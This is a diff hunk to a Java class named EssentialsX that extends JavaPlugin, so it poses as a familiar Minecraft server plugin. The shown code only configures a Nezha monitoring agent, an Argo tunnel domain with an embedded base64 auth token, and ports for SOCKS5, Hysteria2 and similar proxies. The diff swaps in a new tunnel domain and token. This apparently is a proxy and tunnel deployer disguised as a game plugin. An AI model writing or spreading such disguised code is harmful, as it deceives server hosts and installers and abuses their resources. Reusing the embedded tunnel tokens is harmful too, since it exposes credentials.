@@ -79,11 +79,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "greathost.yeser.xx.kg");
-        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiM2I4MGIzMWItY2QwYi00YjE0LWFkOTctMzI3YTA5YzFhZjAwIiwicyI6Ik56aG1OR1V5WVRFdE16SmtNeTAwT1RCaUxUazVOamd0Tm1RM1lUQmpZVGsxTlRNeiJ9");
-        env.put("S5_PORT", "20097");
-        env.put("HY2_PORT", "20205");
-        env.put("TUIC_PORT", "20295");
+        env.put("ARGO_DOMAIN", "greathost2.campfun.eu.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMmY0ZjgzZmQtNGUyZS00YmZjLWI4MWMtZmM4MDczM2VkMzVhIiwicyI6Ik9USTNPRGRsTURNdE16TXlNaTAwTUdOaExXRmhaalF0WmpkbE0yVmlNalJqTXpVNCJ9");
+        env.put("S5_PORT", "20187");
+        env.put("HY2_PORT", "20494");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
